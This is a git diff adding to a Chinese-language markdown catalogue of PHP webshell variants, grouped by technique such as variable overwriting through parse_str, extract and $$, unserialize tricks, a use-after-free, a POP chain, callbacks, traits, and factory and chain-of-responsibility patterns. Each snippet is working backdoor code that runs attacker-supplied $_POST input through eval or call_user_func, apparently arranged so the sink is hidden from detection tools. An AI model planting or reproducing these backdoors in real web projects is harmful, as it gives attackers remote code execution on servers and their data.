@@ -229,6 +229,221 @@ include session_save_path().'/sess_test';
 #### 三目运算
 ```php
 <?php
-eval(false ? 1 : $_POST['code']);
+eval(false ? 1 : $_POST[1]);
 ?>
 ```
+
+# 数据流
+
+#### uaf
+php 5.6测试成功。
+```php
+<?php
+$code = $_POST[1];
+$serialized_string = 'a:1:{i:1;C:11:"ArrayObject":37:{x:i:0;a:2:{i:1;R:4;i:2;r:1;};m:a:0:{}}}';
+$outer_array = unserialize($serialized_string);
+gc_collect_cycles();
+$filler1 = "aaaa";
+$filler2 = &$code;
+
+eval($outer_array);
+?>
+```
+
+#### 非等号赋值-数组传递
+```php
+<?php
+$c = array();
+array_push($c,$_POST[1]);
+eval($c[0]);
+?>
+```
+
+#### 变量覆盖-parse_str
+```php
+<?php
+parse_str("code=$_POST[1]");
+eval($code);
+?>
+```
+
+#### 变量覆盖-双$
+```php
+<?php
+foreach ($_POST as $key => $value) {
+    ${$key} = $value;
+}
+
+eval($code);
+?>
+```
+
+
+#### 变量覆盖-extract
+```php
+<?
+extract($_GET).$a($b);
+```
+
+#### unserialize
+```php
+<?php
+$code=$_POST[1];
+$s=base64_decode('YToyOntpOjE7czo2OiJhc3NlcnQiO2k6MjtzOjEwOiJwaHBpbmZvKCk7Ijt9');
+$o = unserialize($s);
+$o[1]($code);
+?>
+
+```
+
+#### pop链
+```php
+<?php
+
+class Wrapper{
+	public $evil;
+
+	function __destruct() {
+		$evil = new Evil();
+		$evil->func = $_GET['func'];
+		$evil->code = $_POST[1];
+		$evil."11";
+	}
+}
+
+Class Evil{
+	public $func;
+    public $code;
+
+    function __toString() {
+        call_user_func($this->func,$this->code);
+		return "";
+    }
+}
+
+$warpper = new Wrapper();
+?>
+```
+
+#### 回调函数
+https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html
+```php
+$e = $_REQUEST['e'];
+$arr = array($_POST[1],);
+array_filter($arr, $e);
+```
+
+#### trait
+```php
+trait Evilable {
+	public function test($code){
+		eval($code);
+	}
+}
+
+class Legal{
+	use Evilable;
+}
+
+$evil = new Legal();
+$evil->test($_POST[1]);
+```
+
+数据源来于类属性
+```php
+trait Evilable {
+	public $code;
+	public function test(){
+		eval($this->code);
+	}
+}
+
+class Legal{
+	use Evilable;
+}
+
+
+$evil = new Legal();
+$evil->code = $_POST[1];
+$evil->test($evil->code);
+```
+
+#### 自定义路由-工厂模式
+```php
+<?php
+class Evil {
+	public $code;
+	public function test(){
+		eval($this->code);
+	}
+}
+
+class ClassFactory {
+   public function getObject($className){
+      return new $className;
+   }
+}
+
+$classFactory = new ClassFactory();
+$evil = $classFactory->getObject("Evil");
+$evil->code = $_POST[1];
+$evil->test();
+?>
+```
+
+#### 自定义路由-责任链
+```php
+<?php
+
+class Chain{
+	public $level;
+	public $next;
+
+	public function doChain($level,$nothing){
+		if($this->level==$level){
+			$this->doit($nothing);
+		}
+		if($this->next!=null){
+			$this->next->doChain($level,$nothing);
+		}
+   }
+
+	public function doit($nothing){
+	}
+}
+
+class Legal extends Chain{
+	public function __construct(){
+		$this->level=1;
+	}
+
+	public function doit($nothing){
+		echo $code;
+	}
+}
+
+class Evil extends Chain{
+	public $code;
+
+	public function __construct(){
+		$this->level=2;
+	}
+
+	public function doit($nothing){
+		eval($this->code);
+	}
+}
+
+$legal = new Legal();
+$evil = new Evil();
+$legal->next = $evil;
+$evil->next = null;
+
+$evil->code = $_POST[1];
+$legal->doChain(2,"");
+?>
+```
+
+# 参考
+SkyBlue永恒、新仙剑之鸣、anlfi、mochazz、yzddMr6s、JamVayne
+等发过的文章。
